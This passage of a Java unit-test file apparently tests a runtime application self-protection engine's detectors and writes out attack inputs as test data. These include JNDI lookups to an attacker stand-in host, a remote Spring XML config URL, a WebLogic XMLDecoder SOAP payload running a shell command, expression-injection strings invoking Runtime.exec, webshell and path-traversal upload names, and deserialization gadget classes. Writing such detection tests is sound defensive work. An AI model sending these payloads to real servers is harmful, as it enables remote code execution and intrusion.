  void detectsTomcatGhostcatAjpIncludeAttributes() {
    var result =
        engine.detectServletIncludeAttributes(
            Map.of(
                "javax.servlet.include.request_uri",
                "/",
                "javax.servlet.include.path_info",
                "WEB-INF/web.xml",
                "javax.servlet.include.servlet_path",
                "/"),
            requestUri("/asdf"),
            List.of("org.apache.coyote.ajp.AjpProcessor"));

    assertAlgorithm(result, "request_forged_include_attribute");
    assertEquals("protected-resource", result.orElseThrow().details().get("targetType"));
    assertEquals("WEB-INF", result.orElseThrow().details().get("resource"));
    assertEquals("/asdf", result.orElseThrow().details().get("uri"));
  }

  @Test
  void detectsForgedServletIncludeAttributeForServerSideScript() {
    var result =
        engine.detectServletIncludeAttributes(
            Map.of("jakarta.servlet.include.path_info", "/uploads/shell.jsp"),
            requestUri("/"),
            List.of("org.apache.coyote.ajp.AjpProcessor"));

    assertAlgorithm(result, "request_forged_include_attribute");
    assertEquals("server-side-script", result.orElseThrow().details().get("targetType"));
  }

  @Test
  void ignoresLegitimateRequestDispatcherIncludeStack() {
    var result =
        engine.detectServletIncludeAttributes(
            Map.of("javax.servlet.include.servlet_path", "/WEB-INF/jsp/view.jsp"),
            requestUri("/page"),
            List.of("org.apache.catalina.core.ApplicationDispatcher", "com.example.View"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresSafeServletIncludeAttributeTarget() {
    var result =
        engine.detectServletIncludeAttributes(
            Map.of("javax.servlet.include.servlet_path", "/assets/logo.png"),
            requestUri("/"),
            List.of("org.apache.coyote.ajp.AjpProcessor"));

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsMultipartScriptUpload() {
    var result = engine.detectFileUpload("shell.jsp", request());

    assertAlgorithm(result, "fileUpload_multipart_script");
  }

  @Test
  void detectsWebLogicWsUtcJspUpload() {
    RequestContext request =
        new RequestContext(
            "POST",
            "/ws_utc/resources/setting/keystore",
            "",
            Map.of(),
            Map.of("content-type", "multipart/form-data; boundary=ohmyrasp"));

    var result = engine.detectFileUpload("shell.jsp", request);

    assertAlgorithm(result, "fileUpload_multipart_script");
    assertEquals("/ws_utc/resources/setting/keystore", result.orElseThrow().request().uri());
    assertEquals("shell.jsp", result.orElseThrow().details().get("filename"));
  }

  @Test
  void detectsMultipartUploadPathTraversal() {
    var result = engine.detectFileUpload("../../../../../../tmp/success", request());

    assertAlgorithm(result, "fileUpload_path_traversal");
  }

  @Test
  void detectsMultipartOgnlFilenameExpression() {
    var filename =
        "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
            + ".addHeader('X-Test',233*233)}\u0000b";

    var result = engine.detectFileUpload(filename, request());

    assertAlgorithm(result, "fileUpload_multipart_expression");
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(filename.length()), result.orElseThrow().details().get("filenameLength"));
    assertFalse(result.orElseThrow().details().containsKey("filename"));
  }

  @Test
  void detectsEncodedMultipartUploadPathTraversal() {
    var result = engine.detectFileUpload("..%2f..%2f..%2fvar%2flog%2fapp.txt", request());

    assertAlgorithm(result, "fileUpload_path_traversal");
  }

  @Test
  void ignoresMultipartUploadSubdirectoryFilename() {
    var result = engine.detectFileUpload("reports/summary.txt", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBenignExpressionLikeMultipartFilename() {
    var result = engine.detectFileUpload("report-%{yyyy}.txt", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsMultipartHtmlUpload() {
    var result = engine.detectFileUpload("phish.html", request());

    assertAlgorithm(result, "fileUpload_multipart_html");
  }

  @Test
  void detectsMultipartExecutableUpload() {
    var result = engine.detectFileUpload("dropper.exe", request());

    assertAlgorithm(result, "fileUpload_multipart_exe");
  }

  @Test
  void detectsJavaArchivePluginUpload() {
    var result = engine.detectFileUpload("Evil.jar", requestUri("/plugin/add"));

    assertAlgorithm(result, "fileUpload_java_archive");
  }

  @Test
  void detectsJavaArchiveJarUpload() {
    var result = engine.detectFileUpload("Exploit.jar", requestUri("/jars/upload"));

    assertAlgorithm(result, "fileUpload_java_archive");
  }

  @Test
  void detectsJavaArchiveUploadByParameterContext() {
    var request =
        new RequestContext(
            "POST", "/upload", "", Map.of("jarfile", List.of("selected")), Map.of());
    var result = engine.detectFileUpload("Exploit.jar", request);

    assertAlgorithm(result, "fileUpload_java_archive");
  }

  @Test
  void ignoresJavaArchiveRepositoryUpload() {
    var result = engine.detectFileUpload("library.jar", requestUri("/service/rest/v1/components"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresJavaArchiveUploadOnUnrelatedForm() {
    var result = engine.detectFileUpload("library.jar", requestUri("/profile/avatar"));

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsWebdavUpload() {
    var result = engine.detectWebdavUpload("avatar.jpg", "shell.jsp", "MOVE", request());

    assertAlgorithm(result, "fileUpload_webdav");
    assertEquals("server-side-script", result.orElseThrow().details().get("destinationType"));
  }

  @Test
  void detectsWebdavUploadToUnsafeFilesystemDestination() {
    var result =
        engine.detectWebdavUpload(
            "/fileserver/1.txt", "file:///etc/cron.d/root", "MOVE", request());

    assertAlgorithm(result, "fileUpload_webdav");
    assertEquals("unsafe-filesystem-path", result.orElseThrow().details().get("destinationType"));
    assertEquals("/etc/cron.d/root", result.orElseThrow().details().get("destinationPath"));
  }

  @Test
  void detectsActiveMqFileserverMoveToWebshell() {
    var result =
        engine.detectWebdavUpload(
            "/fileserver/2.txt", "file:///opt/activemq/webapps/api/s.jsp", "MOVE", request());

    assertAlgorithm(result, "fileUpload_webdav");
    assertEquals("server-side-script", result.orElseThrow().details().get("destinationType"));
    assertEquals("/fileserver/2.txt", result.orElseThrow().details().get("source"));
  }

  @Test
  void ignoresBenignWebdavUploadMove() {
    var result =
        engine.detectWebdavUpload(
            "/fileserver/avatar.jpg", "/fileserver/avatar-renamed.jpg", "MOVE", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresWebdavUploadDestinationForReadOnlyMethod() {
    var result =
        engine.detectWebdavUpload(
            "/fileserver/1.txt", "file:///etc/cron.d/root", "GET", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsRenameWebshell() {
    var result = engine.detectRename("avatar.jpg", "shell.jsp", request());

    assertAlgorithm(result, "rename_webshell");
  }

  @Test
  void detectsLinkWebshell() {
    var result = engine.detectLink("avatar.jpg", "shell.jsp", "hard", request());

    assertAlgorithm(result, "link_webshell");
  }

  @Test
  void detectsJndi() {
    var result = engine.detectJndi("ldap://127.0.0.1:1389/a", request());

    assertTrue(result.isPresent());
    assertEquals("jndi_disable_all", result.orElseThrow().algorithm());
  }

  @Test
  void detectsJndiRemoteRmiScheme() {
    var result = engine.detectJndi("rmi://attacker.example.com:1099/Exploit", request());

    assertTrue(result.isPresent());
    assertEquals("jndi_disable_all", result.orElseThrow().algorithm());
  }

  @Test
  void ignoresLocalContainerJndiNames() {
    // Legitimate Java EE / container-managed lookups must not trip the detector
    // (closes the documented 100% JNDI false-positive precision gap).
    assertTrue(engine.detectJndi("java:comp/env/jdbc/AppDataSource", request()).isEmpty());
    assertTrue(engine.detectJndi("java:comp/env/jms/QueueConnectionFactory", request()).isEmpty());
    assertTrue(engine.detectJndi("java:global/AppEjb/UserService", request()).isEmpty());
    assertTrue(engine.detectJndi("jdbc/AppDataSource", request()).isEmpty());
  }

  @Test
  void detectsKafkaCve202325194DruidSamplerJaasJndiLoginModuleRemoteProvider() {
    String config =
        "com.sun.security.auth.module.JndiLoginModule required "
            + "user.provider.url=\"ldap://java-chains:50389/x\" "
            + "useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";";
    String body =
        "{\"type\":\"kafka\",\"spec\":{\"ioConfig\":{\"consumerProperties\":{"
            + "\"sasl.jaas.config\":\""
            + jsonString(config)
            + "\"}}}}";
    var result =
        engine.detectJaasConfig(
            config,
            "KafkaSasl",
            new RequestContext(
                "POST",
                "/druid/indexer/v1/sampler",
                "for=connect",
                Map.of("for", List.of("connect")),
                Map.of("content-type", "application/json", "user-agent", "JUnit"),
                body));

    assertAlgorithm(result, "jndi_jaas_config");
    assertEquals("KafkaSasl", result.orElseThrow().details().get("mechanism"));
    assertEquals("true", result.orElseThrow().details().get("requestControlled"));
  }

  @Test
  void ignoresBenignJaasConfigWithoutJndiLoginModule() {
    String config =
        "org.apache.kafka.common.security.scram.ScramLoginModule required "
            + "username=\"app\" password=\"secret\";";

    assertTrue(engine.detectJaasConfig(config, "KafkaSasl", request()).isEmpty());
  }

  @Test
  void detectsDeserializationBlacklist() {
    var result = engine.detectDeserialization("io.ohmyrasp.playground.EvilSerialized", request());

    assertTrue(result.isPresent());
    assertEquals("deserialization_blacklist", result.orElseThrow().algorithm());
  }

  @Test
  void detectsExpandedDeserializationGadgetClass() {
    var result = engine.detectDeserialization("com.sun.rowset.JdbcRowSetImpl", request());

    assertAlgorithm(result, "deserialization_blacklist");
  }

  @Test
  void detectsBeanShellDeserializationGadgetFamily() {
    var result = engine.detectDeserialization("bsh.XThis", request());

    assertAlgorithm(result, "deserialization_gadget");
  }

  @Test
  void detectsRomeDeserializationGadgetFamily() {
    var result =
        engine.detectDeserialization("com.sun.syndication.feed.impl.ToStringBean", request());

    assertAlgorithm(result, "deserialization_gadget");
  }

  @Test
  void detectsC3p0DeserializationGadgetFamily() {
    var result =
        engine.detectDeserialization(
            "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource", request());

    assertAlgorithm(result, "deserialization_gadget");
  }

  @Test
  void detectsCommonsBeanutilsDeserializationGadgetFamily() {
    var result =
        engine.detectDeserialization("org.apache.commons.beanutils.BeanComparator", request());

    assertAlgorithm(result, "deserialization_gadget");
  }

  @Test
  void detectsTomcatTribesClusterMessageDeserializationGadget() {
    var result =
        engine.detectDeserialization(
            "org.apache.commons.collections.functors.InvokerTransformer",
            RequestContext.empty(),
            tomcatTribesStack());

	    assertAlgorithm(result, "deserialization_cluster_message");
	    assertEquals("tomcat-tribes", result.orElseThrow().details().get("transport"));
	    assertEquals(
	        "tomcat-tribes-encrypt", result.orElseThrow().details().get("securityInterceptor"));
	  }

  @Test
  void ignoresBenignTomcatTribesClusterMessageClass() {
    var result =
        engine.detectDeserialization("java.util.HashMap", RequestContext.empty(), tomcatTribesStack());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsLog4jSocketServerDeserializationGadget() {
    var result =
        engine.detectDeserialization(
            "org.apache.commons.collections.functors.InvokerTransformer",
            RequestContext.empty(),
            log4jSocketServerStack());

    assertAlgorithm(result, "deserialization_logging_message");
    assertEquals("log4j-socket", result.orElseThrow().details().get("transport"));
  }

  @Test
  void ignoresBenignLog4jSocketServerMessageClass() {
    var result =
        engine.detectDeserialization(
            "org.apache.logging.log4j.core.impl.MutableLogEvent",
            RequestContext.empty(),
            log4jSocketServerStack());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsCasWebflowClientStateDeserializationGadget() {
    var result =
        engine.detectDeserialization(
            "org.apache.commons.collections4.functors.InvokerTransformer",
            RequestContext.empty(),
            casWebflowStateStack());

    assertAlgorithm(result, "deserialization_webflow_state");
    assertEquals("cas-webflow-state", result.orElseThrow().details().get("transport"));
  }

  @Test
  void ignoresBenignWebflowClientStateClass() {
    var result =
        engine.detectDeserialization(
            "org.springframework.webflow.execution.impl.FlowExecutionImpl",
            RequestContext.empty(),
            casWebflowStateStack());

    assertTrue(result.isEmpty());
  }

  @Test
  void fallsBackToGenericBlacklistForWebflowControllerStackWithoutClientStateDeserialization() {
    var result =
        engine.detectDeserialization(
            "org.apache.commons.collections4.functors.InvokerTransformer",
            RequestContext.empty(),
            List.of(
                "org.apereo.cas.web.flow.CasWebflowConfigurer",
                "org.springframework.webflow.mvc.servlet.FlowHandlerAdapter",
                "org.springframework.web.servlet.DispatcherServlet"));

    assertAlgorithm(result, "deserialization_blacklist");
  }

  @Test
  void detectsRmiTransportDeserializationGadget() {
    var result =
        engine.detectDeserialization("bsh.XThis", RequestContext.empty(), rmiTransportStack());

    assertAlgorithm(result, "deserialization_rmi_transport");
    assertEquals("rmi-transport", result.orElseThrow().details().get("transport"));
  }

  @Test
  void detectsNeo4jShellRmiTransportRhinoGadget() {
    var result =
        engine.detectDeserialization(
            "org.mozilla.javascript.NativeJavaObject",
            RequestContext.empty(),
            neo4jShellRmiStack());

    assertAlgorithm(result, "deserialization_rmi_transport");
    assertEquals("rmi-transport", result.orElseThrow().details().get("transport"));
  }

  @Test
  void ignoresBenignRmiTransportDeserializationClass() {
    var result =
        engine.detectDeserialization(
            "org.apache.jmeter.engine.RemoteJMeterEngineImpl",
            RequestContext.empty(),
            rmiTransportStack());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsWeblogicT3RemotingTransportDeserializationGadget() {
    var result =
        engine.detectDeserialization(
            "sun.rmi.server.UnicastRef", RequestContext.empty(), weblogicT3Stack());

    assertAlgorithm(result, "deserialization_remoting_transport");
    assertEquals("weblogic-t3", result.orElseThrow().details().get("transport"));
  }

  @Test
  void detectsWeblogicIiopRemotingTransportDeserializationGadget() {
    var result =
        engine.detectDeserialization(
            "com.sun.rowset.JdbcRowSetImpl", RequestContext.empty(), weblogicIiopStack());

    assertAlgorithm(result, "deserialization_remoting_transport");
    assertEquals("weblogic-iiop", result.orElseThrow().details().get("transport"));
  }

  @Test
  void ignoresBenignWeblogicRemotingTransportDeserializationClass() {
    var result =
        engine.detectDeserialization(
            "weblogic.rjvm.PeerInfo", RequestContext.empty(), weblogicT3Stack());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsActiveMqJmsObjectMessageDeserializationGadget() {
    var result =
        engine.detectDeserialization(
            "com.rometools.rome.feed.impl.ToStringBean",
            RequestContext.empty(),
            activeMqJmsObjectMessageStack());

    assertAlgorithm(result, "deserialization_jms_object_message");
    assertEquals("activemq-object-message", result.orElseThrow().details().get("transport"));
  }

  @Test
  void ignoresBenignJmsObjectMessageDeserializationClass() {
    var result =
        engine.detectDeserialization(
            "com.example.messaging.OrderEvent",
            RequestContext.empty(),
            activeMqJmsObjectMessageStack());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsJenkinsCliSignedObjectDeserializationWrapper() {
    var result =
        engine.detectDeserialization(
            "java.security.SignedObject",
            RequestContext.empty(),
            jenkinsCliSignedObjectStack());

    assertAlgorithm(result, "deserialization_signed_object");
    assertEquals("jenkins-cli-remoting", result.orElseThrow().details().get("transport"));
  }

  @Test
  void ignoresSignedObjectDeserializationOutsideRemoteCli() {
    var result =
        engine.detectDeserialization(
            "java.security.SignedObject",
            RequestContext.empty(),
            List.of("com.example.security.SignedEnvelopeVerifier", "java.io.ObjectInputStream"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBenignJenkinsCliDeserializationClass() {
    var result =
        engine.detectDeserialization(
            "hudson.cli.CLICommand", RequestContext.empty(), jenkinsCliSignedObjectStack());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsRmiRegistryProxyBindFromTransport() {
    var result =
        engine.detectRmiRegistryBind(
            "bind",
            "pwn",
            "jdk.proxy1.$Proxy0",
            RequestContext.empty(),
            rmiRegistryStack());

    assertAlgorithm(result, "deserialization_rmi_registry_bind");
    assertEquals("rmi-transport", result.orElseThrow().details().get("source"));
  }

  @Test
  void detectsRmiRegistryUnicastRefBindBypassShape() {
    var result =
        engine.detectRmiRegistryBind(
            "rebind",
            "pwn",
            "sun.rmi.server.UnicastRef",
            RequestContext.empty(),
            rmiRegistryStack());

    assertAlgorithm(result, "deserialization_rmi_registry_bind");
  }

  @Test
  void ignoresRmiRegistryProxyBindOutsideTransportDispatch() {
    var result =
        engine.detectRmiRegistryBind(
            "bind", "local", "jdk.proxy1.$Proxy0", RequestContext.empty(), List.of("app.Main"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresOrdinaryRmiRegistryImplementationBind() {
    var result =
        engine.detectRmiRegistryBind(
            "bind",
            "service",
            "com.example.ExportedService",
            RequestContext.empty(),
            rmiRegistryStack());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsSuspiciousFileBackedSessionDeserialization() {
    var result = engine.detectSessionDeserialization(".deserialize", "TomcatFileStore", request());

    assertAlgorithm(result, "deserialization_session_file");
  }

  @Test
  void detectsTraversalFileBackedSessionDeserialization() {
    var result =
        engine.detectSessionDeserialization("../work/.payload", "TomcatFileStore", request());

    assertAlgorithm(result, "deserialization_session_file");
  }

  @Test
  void ignoresNormalRoutedTomcatSessionId() {
    var result =
        engine.detectSessionDeserialization(
            "A1B2C3D4E5F60718293A4B5C6D7E8F90.node1", "TomcatFileStore", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBenignDeserializationClass() {
    var result = engine.detectDeserialization("java.util.HashMap", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsFastjsonPolymorphicJndiGadget() {
    var result =
        engine.detectPolymorphicType(
            "fastjson",
            "com.sun.rowset.JdbcRowSetImpl",
            request(Map.of("@type", List.of("com.sun.rowset.JdbcRowSetImpl"))));

    assertAlgorithm(result, "deserialization_polymorphic_type");
  }

  @Test
  void ignoresFastjsonClassLiteralUntilConcreteDangerousTypeIsResolved() {
    var result =
        engine.detectPolymorphicType(
            "fastjson", "java.lang.Class", request(Map.of("@type", List.of("java.lang.Class"))));

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsJacksonPolymorphicTemplatesGadgetWithArraySyntax() {
    var result =
        engine.detectPolymorphicType(
            "jackson",
            "[Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;",
            request());

    assertAlgorithm(result, "deserialization_polymorphic_type");
  }

  @Test
  void detectsJacksonPolymorphicSpringXmlContextGadget() {
    var result =
        engine.detectPolymorphicType(
            "jackson",
            "org.springframework.context.support.FileSystemXmlApplicationContext",
            request());

    assertAlgorithm(result, "deserialization_polymorphic_type");
  }

  @Test
  void detectsXstreamPolymorphicJndiPrefixGadget() {
    var result =
        engine.detectPolymorphicType(
            "xstream", "com.sun.jndi.rmi.registry.BindingEnumeration", request());

    assertAlgorithm(result, "deserialization_polymorphic_type");
  }

  @Test
  void detectsSnakeyamlPolymorphicH2JdbcConnection() {
    var result =
        engine.detectPolymorphicType(
            "snakeyaml",
            "org.h2.jdbc.JdbcConnection",
            request(Map.of("type", List.of("org.h2.jdbc.JdbcConnection"))));

    assertAlgorithm(result, "deserialization_polymorphic_type");
  }

  @Test
  void ignoresBenignPolymorphicType() {
    var result = engine.detectPolymorphicType("jackson", "java.util.HashMap", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsFastjson1283DirectHttpClassResource() {
    var result =
        engine.detectFastjsonClassResource(
            "http://192.168.65.254:19090/a.class", request());

    assertAlgorithm(result, "deserialization_fastjson_resource_url");
    assertEquals("block", result.orElseThrow().action());
    assertEquals("http", result.orElseThrow().details().get("mechanism"));
    assertEquals("ParserConfig.checkAutoType", result.orElseThrow().details().get("source"));
  }

  @Test
  void detectsFastjson1283RemoteJarAndProcFdClassResources() {
    var remote =
        engine.detectFastjsonClassResource(
            "jar:http://192.168.65.254:19090/probe!/foo/Exception.class", request());
    var procFd =
        engine.detectFastjsonClassResource(
            "jar:file:/proc/self/fd/3!/fd3/Exception.class", request());

    assertAlgorithm(remote, "deserialization_fastjson_resource_url");
    assertEquals("jar:http", remote.orElseThrow().details().get("mechanism"));
    assertAlgorithm(procFd, "deserialization_fastjson_resource_url");
    assertEquals("jar:file:proc-fd", procFd.orElseThrow().details().get("mechanism"));
  }

  @Test
  void ignoresNormalFastjsonClasspathResourcesAndUnrelatedFileUrls() {
    assertTrue(
        engine
            .detectFastjsonClassResource("com/example/orders/Order.class", request())
            .isEmpty());
    assertTrue(
        engine
            .detectFastjsonClassResource("jar:file:/opt/app/lib/models.jar!/Order.class", request())
            .isEmpty());
    assertTrue(engine.detectFastjsonClassResource(null, request()).isEmpty());
  }

  @Test
  void detectsOpenWireProtocolClassInstantiationWithRemoteSpringConfig() {
    String xml = "http://attacker.example/poc.xml";
    var result =
        engine.detectProtocolClassInstantiation(
            "OpenWire",
            "org.springframework.context.support.ClassPathXmlApplicationContext",
            List.of(xml),
            request(Map.of("xml", List.of(xml))));

    assertAlgorithm(result, "deserialization_protocol_class");
    assertEquals("OpenWire", result.orElseThrow().details().get("protocol"));
    assertEquals("http", result.orElseThrow().details().get("remoteConfigScheme"));
  }

  @Test
  void detectsOpenWireProtocolClassInstantiationWithXbeanContext() {
    var result =
        engine.detectProtocolClassInstantiation(
            "OpenWire",
            "org.apache.xbean.spring.context.ResourceXmlApplicationContext",
            List.of("xbean:http://attacker.example/poc.xml"),
            request());

    assertAlgorithm(result, "deserialization_protocol_class");
  }

  @Test
  void detectsOpenWireProtocolClassInstantiationWithGadgetFamily() {
    var result =
        engine.detectProtocolClassInstantiation(
            "OpenWire", "bsh.XThis", List.of("payload"), RequestContext.empty());

    assertAlgorithm(result, "deserialization_protocol_class");
  }

  @Test
  void ignoresOrdinaryOpenWireThrowableClass() {
    var result =
        engine.detectProtocolClassInstantiation(
            "OpenWire", "java.lang.Exception", List.of("normal failure"), request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresProtocolClassInstantiationWithoutProtocolContext() {
    var result =
        engine.detectProtocolClassInstantiation(
            "", "org.springframework.context.support.ClassPathXmlApplicationContext", List.of(), request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsHttpInvokerDeserializationDuringRequest() {
    var context =
        new RequestContext(
            "POST",
            "/dubbo/hello",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "JUnit",
                "content-type",
                "application/x-java-serialized-object"));

    var result = engine.detectHttpInvokerDeserialization("SpringHttpInvoker", context);

    assertAlgorithm(result, "deserialization_http_invoker");
    assertEquals("SpringHttpInvoker", result.orElseThrow().details().get("mechanism"));
    assertEquals("application/x-java-serialized-object", result.orElseThrow().details().get("contentType"));
  }

  @Test
  void ignoresHttpInvokerDeserializationOutsideRequest() {
    var result =
        engine.detectHttpInvokerDeserialization("SpringHttpInvoker", RequestContext.empty());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsHttpRequestObjectStreamDeserialization() {
    var result =
        engine.detectHttpObjectStreamDeserialization(
            "org.apache.catalina.connector.CoyoteInputStream", request(), List.of());

    assertAlgorithm(result, "deserialization_http_object_stream");
    assertEquals("servlet-input-stream", result.orElseThrow().details().get("source"));
  }

  @Test
  void detectsHttpObjectStreamBySerializedContentType() {
    var context =
        new RequestContext(
            "POST",
            "/invoker/readonly",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/x-java-serialized-object"));

    var result =
        engine.detectHttpObjectStreamDeserialization(
            "java.io.BufferedInputStream", context, List.of());

    assertAlgorithm(result, "deserialization_http_object_stream");
    assertEquals("serialized-content-type", result.orElseThrow().details().get("source"));
  }

  @Test
  void detectsMiddlewareHttpInvokerObjectStreamStack() {
    var result =
        engine.detectHttpObjectStreamDeserialization(
            "java.io.BufferedInputStream",
            request(),
            List.of("org.jboss.invocation.http.servlet.ReadOnlyAccessFilter"));

    assertAlgorithm(result, "deserialization_http_object_stream");
    assertEquals("middleware-http-invoker", result.orElseThrow().details().get("source"));
  }

  @Test
  void detectsJbossJmxInvokerObjectStreamStack() {
    var result =
        engine.detectHttpObjectStreamDeserialization(
            "java.io.BufferedInputStream",
            request(),
            List.of("org.jboss.invocation.http.servlet.InvokerServlet"));

    assertAlgorithm(result, "deserialization_http_object_stream");
    assertEquals("middleware-http-invoker", result.orElseThrow().details().get("source"));
  }

  @Test
  void detectsJbossMqHttpilObjectStreamStack() {
    var result =
        engine.detectHttpObjectStreamDeserialization(
            "java.io.BufferedInputStream",
            request(),
            List.of("org.jboss.mq.il.http.HTTPServerILServlet"));

    assertAlgorithm(result, "deserialization_http_object_stream");
    assertEquals("middleware-http-invoker", result.orElseThrow().details().get("source"));
  }

  @Test
  void ignoresFileObjectStreamDuringHttpRequest() {
    var result =
        engine.detectHttpObjectStreamDeserialization(
            "java.io.FileInputStream", request(), List.of("com.example.ReportController"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresRequestObjectStreamOutsideHttpRequest() {
    var result =
        engine.detectHttpObjectStreamDeserialization(
            "org.apache.catalina.connector.CoyoteInputStream", RequestContext.empty(), List.of());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsHessianDangerousTypeResolution() {
    var result = engine.detectHessianType("org.apache.commons.beanutils.BeanComparator", request());

    assertAlgorithm(result, "deserialization_hessian_type");
    assertEquals(
        "org.apache.commons.beanutils.BeanComparator",
        result.orElseThrow().details().get("class"));
    assertEquals("true", result.orElseThrow().details().get("gadgetFamily"));
  }

  @Test
  void detectsHessianSpringContextTypeResolution() {
    var result =
        engine.detectHessianType(
            "org.springframework.context.support.ClassPathXmlApplicationContext",
            RequestContext.empty());

    assertAlgorithm(result, "deserialization_hessian_type");
  }

  @Test
  void ignoresBenignHessianTypeResolution() {
    var result = engine.detectHessianType("java.util.HashMap", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsXmlRpcSerializableValueDuringRequest() {
    var context =
        new RequestContext(
            "POST",
            "/webtools/control/xmlrpc",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/xml"));

    var result = engine.detectXmlRpcSerializableValue("ApacheXmlRpc", context);

    assertAlgorithm(result, "deserialization_xmlrpc_serialized");
    assertEquals("ApacheXmlRpc", result.orElseThrow().details().get("mechanism"));
    assertEquals("application/xml", result.orElseThrow().details().get("contentType"));
  }

  @Test
  void ignoresXmlRpcSerializableValueOutsideRequest() {
    var result =
        engine.detectXmlRpcSerializableValue("ApacheXmlRpc", RequestContext.empty());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsXmlDecoderProcessBuilderStart() {
    var result =
        engine.detectXmlDecoderExpression(
            "java.lang.ProcessBuilder",
            "start",
            List.of("sh", "-c", "id"),
            request(),
            xmlDecoderStack());

    assertAlgorithm(result, "xml_decoder_runtime");
  }

  @Test
  void detectsWebLogicWorkContextXmlDecoderProcessBuilderStart() {
    String body =
        """
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java version="1.4.0" class="java.beans.XMLDecoder">
                <void class="java.lang.ProcessBuilder">
                  <array class="java.lang.String" length="3">
                    <void index="0"><string>sh</string></void>
                    <void index="1"><string>-c</string></void>
                    <void index="2"><string>id</string></void>
                  </array>
                  <void method="start"/>
                </void>
              </java>
            </work:WorkContext>
          </soapenv:Header>
          <soapenv:Body/>
        </soapenv:Envelope>
        """;
    RequestContext context =
        new RequestContext(
            "POST",
            "/wls-wsat/CoordinatorPortType",
            "",
            Map.of(),
            Map.of("content-type", "text/xml"),
            body);

    var result =
        engine.detectXmlDecoderExpression(
            "java.lang.ProcessBuilder",
            "start",
            List.of("sh", "-c", "id"),
            context,
            xmlDecoderStack());

    assertAlgorithm(result, "xml_decoder_runtime");
    assertEquals("/wls-wsat/CoordinatorPortType", result.orElseThrow().request().uri());
    assertEquals("java.lang.ProcessBuilder", result.orElseThrow().details().get("target"));
  }

  @Test
  void detectsXmlDecoderRuntimeExec() {
    var result =
        engine.detectXmlDecoderExpression(
            "java.lang.Runtime", "exec", List.of("id"), request(), xmlDecoderStack());

    assertAlgorithm(result, "xml_decoder_runtime");
  }

  @Test
  void detectsXmlDecoderServerSideScriptWriter() {
    var result =
        engine.detectXmlDecoderExpression(
            "java.io.PrintWriter", "new", List.of("/tmp/shell.jsp"), request(), xmlDecoderStack());

    assertAlgorithm(result, "xml_decoder_webshell");
  }

  @Test
  void ignoresJavaBeansRuntimeOutsideXmlDecoderStack() {
    var result =
        engine.detectXmlDecoderExpression(
            "java.lang.ProcessBuilder", "start", List.of("id"), request(), List.of("app.BeanUtil"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBackgroundXmlDecoderRuntime() {
    var result =
        engine.detectXmlDecoderExpression(
            "java.lang.ProcessBuilder",
            "start",
            List.of("id"),
            RequestContext.empty(),
            xmlDecoderStack());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsOgnlBlacklist() {
    var result = engine.detectOgnl("@java.lang.Runtime@getRuntime().exec('id')", request());

    assertAlgorithm(result, "ognl_blacklist");
  }

  @Test
  void detectsOgnlLengthLimit() {
    var result = engine.detectOgnl("a".repeat(401), request());

    assertAlgorithm(result, "ognl_length_limit");
  }

  @Test
  void detectsSpringExpressionRuntimeExecution() {
    var expression = "T(java.lang.Runtime).getRuntime().exec('id')";
    var result =
        engine.detectExpression(
            "spel",
            expression,
            request(Map.of("spring.cloud.function.routing-expression", List.of(expression))));

    assertAlgorithm(result, "spel_runtime");
  }

  @Test
  void detectsTemplateRuntimeExecution() {
    var result =
        engine.detectExpression(
            "template",
            "#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))",
            request());

    assertAlgorithm(result, "template_runtime");
  }

  @Test
  void detectsJexlRuntimeExecution() {
    var result =
        engine.detectExpression(
            "jexl",
            "233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/success')",
            request());

    assertAlgorithm(result, "jexl_runtime");
  }

  @Test
  void detectsElReflectiveRuntimeExecution() {
    var result =
        engine.detectExpression(
            "el",
            "${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('id')}",
            request());

    assertAlgorithm(result, "el_runtime");
  }

  @Test
  void detectsJavascriptRuntimeExecution() {
    var result =
        engine.detectExpression(
            "javascript",
            "function(){ java.lang.Runtime.getRuntime().exec('id'); }",
            request());

    assertAlgorithm(result, "javascript_runtime");
  }

  @Test
  void detectsJiffleRuntimeExecutionWithoutLoggingRawScript() {
    String expression =
